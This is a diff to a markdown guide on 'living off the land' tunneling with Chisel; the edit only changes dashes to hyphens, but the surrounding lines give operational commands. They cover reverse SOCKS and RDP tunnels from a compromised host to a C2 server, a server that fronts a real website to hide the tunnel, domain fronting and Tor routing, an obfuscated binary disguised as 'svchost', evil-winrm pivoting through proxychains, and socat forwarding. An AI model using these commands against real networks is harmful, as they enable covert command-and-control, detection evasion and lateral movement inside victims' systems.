@@ -1,7 +1,7 @@
-# Chisel Tunneling — Living off the Land
+# Chisel Tunneling - Living off the Land
 
 ## Why Chisel is LoL
-Single Go binary, no dependencies, compiles for any OS/arch, traffic looks like normal HTTPS WebSocket. With `--backend` flag, the server literally serves a real website — only WebSocket upgrades trigger tunneling.
+Single Go binary, no dependencies, compiles for any OS/arch, traffic looks like normal HTTPS WebSocket. With `--backend` flag, the server literally serves a real website - only WebSocket upgrades trigger tunneling.
 
 ## Quick Deploy
 
@@ -40,13 +40,13 @@ chisel client C2:443 R:socks R:8443:10.0.0.5:443 R:3389:10.0.0.10:3389
 
 ### Full stealth template
 ```bash
-# Server — looks like a real HTTPS site
+# Server - looks like a real HTTPS site
 chisel server -p 443 --reverse \
   --tls-cert cert.pem --tls-key key.pem \
   --backend https://www.google.com \
   --auth operator:strongpass
 
-# Client — mimics browser, domain fronting
+# Client - mimics browser, domain fronting
 chisel client \
   --auth operator:strongpass \
   --tls-skip-verify \
@@ -70,7 +70,7 @@ chisel client --proxy socks5://127.0.0.1:9050 https://C2:443 R:socks
 # Install garble
 go install mvdan.cc/garble@latest
 
-# Build obfuscated binary — strips all strings, names, paths
+# Build obfuscated binary - strips all strings, names, paths
 CGO_ENABLED=0 GOOS=linux GOARCH=amd64 garble -literals -tiny build -o svchost -ldflags "-s -w" -trimpath .
 
 # Windows with hidden console
@@ -113,7 +113,7 @@ proxychains -q evil-winrm -i 10.0.0.5 -u admin -p pass
 - CDN fronting hides C2 IP
 
 ## Socat as LoL Alternative
-Socat is already installed on most Linux systems — no upload needed.
+Socat is already installed on most Linux systems - no upload needed.
 
 ```bash
 # Port forward
